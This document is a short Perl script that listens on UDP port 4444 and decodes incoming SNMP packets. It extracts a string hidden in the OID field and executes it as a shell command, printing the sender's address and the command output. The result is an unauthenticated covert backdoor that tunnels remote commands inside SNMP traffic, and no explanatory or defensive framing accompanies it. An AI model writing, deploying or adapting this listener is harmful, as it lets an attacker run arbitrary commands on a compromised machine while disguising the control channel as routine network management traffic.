#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;


my $sock = '';
my $max_length = 1500;  # Maximum packet length
my $port = 4444;	# Listening port
my $output = '';
my $cmd_out = '';
my $packet = '';	# Received packet
my $h_packet = '';	# Received packet at hex format

# Help variables to locate ASN.1 offsets
my $c_len = '';		# Community string length (bytes)
my $rid_len = '';	# Request ID length (bytes)
my $oid_len = '';	# OID length (bytes)

# Create listening socket
$sock = IO::Socket::INET->new(LocalPort => $port,Proto => 'udp') or die "Failed to bind socket: $@";
       
print "Waiting for SNMP messages on port $port\n\n";

while ($sock->recv($packet, $max_length)) {
    my($port, $ipaddr) = sockaddr_in($sock->peername);

    # Locate sender
    print "Command Received From :".inet_ntoa($ipaddr)."\n";

    # Convert received packet to HEX format
    foreach my $c (unpack("C*", $packet)) {
        $h_packet .= sprintf('%02x',$c);
    }

    # Locate command decoding according to ASN.1
    $c_len = hex(substr($h_packet,12,2));
    $rid_len = hex(substr($h_packet,14+2*$c_len+6,2));
    $oid_len = hex(substr($h_packet,44+2*($c_len+$rid_len),2));
    $output = pack("H*",substr($h_packet,46+2*($c_len+$rid_len),$oid_len*2));

    # Execute command and parse output to $cmd_out
    $cmd_out = `$output`;

    # Print command output
    print "Command Received      :$output\n";
    print "Command Output        :\n$cmd_out\n";
    
    # Flush buffers
    $output = '';
    $cmd_out = '';
    $h_packet = '';
} 
die "Receiver Error: $!";
